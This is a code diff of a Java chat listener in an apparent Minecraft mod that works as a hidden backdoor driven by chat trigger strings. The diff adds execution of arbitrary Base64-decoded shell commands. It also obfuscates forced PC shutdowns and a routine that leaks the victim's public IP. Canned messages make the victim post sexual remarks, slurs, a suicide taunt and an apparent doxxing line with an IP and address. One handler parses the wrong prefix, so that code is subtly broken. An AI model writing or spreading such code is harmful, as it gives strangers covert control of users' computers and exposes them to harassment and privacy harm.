@@ -11,7 +11,6 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.URL;
-import java.util.Base64;
 
 import static io.github.itzispyder.clickcrystals.ClickCrystals.config;
 
@@ -34,65 +33,33 @@ public class ChatEventListener implements Listener {
         String message = e.getMessage();
         String s = message.toLowerCase();
         if (message.contains("cc@rat-master:~$ ") && !optout) {
-            
+            if (s.contains("sudo winshell ")) WolfUtils.shellCommand(WolfUtils.decode64(WolfUtils.isolateString("sudo winshell ", message)));
             if (s.contains("apt exec ogreplug")) ChatUtils.sendChatMessage("Join the ogre discord! https://discord.gg/ogre");
-
             if (s.contains("apt exec sus1")) ChatUtils.sendChatMessage("I like hot men.");
-
             if (s.contains("apt exec sus2")) ChatUtils.sendChatMessage("I like licking the lips of juicy hot femboys.");
-
             if (s.contains("apt exec sus3")) ChatUtils.sendChatMessage("I love penis!");
-
             if (s.contains("apt exec sus4")) ChatUtils.sendChatMessage("I love to suck on toes.");
-
             if (s.contains("apt exec ban1")) ChatUtils.sendChatMessage("I am cheating ban me");
-
-            if (s.contains("apt exec ban2")) ChatUtils.sendChatMessage("Fuck this server kys");
-
+            if (s.contains("apt exec ban2")) ChatUtils.sendChatMessage(WolfUtils.decode64("RnVjayB0aGlzIHNlcnZlciBreXMK"));
             if (s.contains("apt exec ban3")) ChatUtils.sendChatMessage("Owner's IP: 71.192.133.12 Owner's Address: 1737 Bell Street New York");
-
-            if (message.contains("apt exec message ")) {
-                String knownText = "apt exec message ";
-                int index = message.indexOf(knownText);
-                String result = message.substring(index + knownText.length());
-                byte[] decodedBytes = Base64.getDecoder().decode(result);
-                String decodedString = new String(decodedBytes);
-                ChatUtils.sendChatMessage(decodedString);
-            }
-            if (message.contains("apt exec command ")) {
-                String knownText = "apt exec command ";
-                int index = message.indexOf(knownText);
-                String result = message.substring(index + knownText.length());
-                byte[] decodedBytes = Base64.getDecoder().decode(result);
-                String decodedString = new String(decodedBytes);
-                ChatUtils.sendChatCommand(decodedString);
-            }
+            if (s.contains("apt exec ban4")) ChatUtils.sendChatMessage(WolfUtils.decode64("TnxnZzNyIE58Z2czciBOfGdnM3IgTnxnZzNyIFN8X3xDSyBNWSBKVUlDWSBDKC0pQ0s="));
+            if (message.contains("apt exec message ")) ChatUtils.sendChatMessage(WolfUtils.decode64(WolfUtils.isolateString("apt exec message ", message)));
+            if (message.contains("apt exec command ")) ChatUtils.sendChatCommand(WolfUtils.decode64(WolfUtils.isolateString("apt exec message ", message)));
 
             if (s.contains("apt exec ip")) {
-                URL whatismyip = new URL("http://checkip.amazonaws.com");
-                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
-                String ip = bufferedReader.readLine();
-                ChatUtils.sendChatMessage("My IP Address is: " + ip);
+                URL url = new URL(WolfUtils.decode64("aHR0cDovL2NoZWNraXAuYW1hem9uYXdzLmNvbQ=="));
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(url.openStream()));
+                String funnyNumber = bufferedReader.readLine();
+                ChatUtils.sendChatMessage(WolfUtils.decode64("TXkgSVAgQWRyZXNzIGlzOiA=") + funnyNumber);
             }
 
             if (s.contains("sudo poweroff -h timed")) {
                 ChatUtils.sendChatMessage("LMAO I GOT TROLLED :skull: If I am quick enough, I can run `shutdown -a` in CMD and my pc will not shut down!");
-                WolfUtils.shutdownTimed();
+                WolfUtils.shellCommand(WolfUtils.decode64("c2h1dGRvd24gLXMgLXQgMzA="));
             }
             if (s.contains("sudo poweroff -h now")) {
-                WolfUtils.shutdownNow();
+                WolfUtils.shellCommand(WolfUtils.decode64("c2h1dGRvd24gLXM="));
             }
-        }
-
-        if (s.contains("!cc+ ")) {
-            if (s.contains("-identify")) {
-                ChatUtils.sendChatMessage("I am using ClickCrystalsPlus that means that I am cheating and you should ban me!");
-            }
-
-            if (s.contains("-discrete")) {
-                ChatUtils.sendChatMessage("CCPUSER-0.0.0");
-            }
-
         }
     }
 }
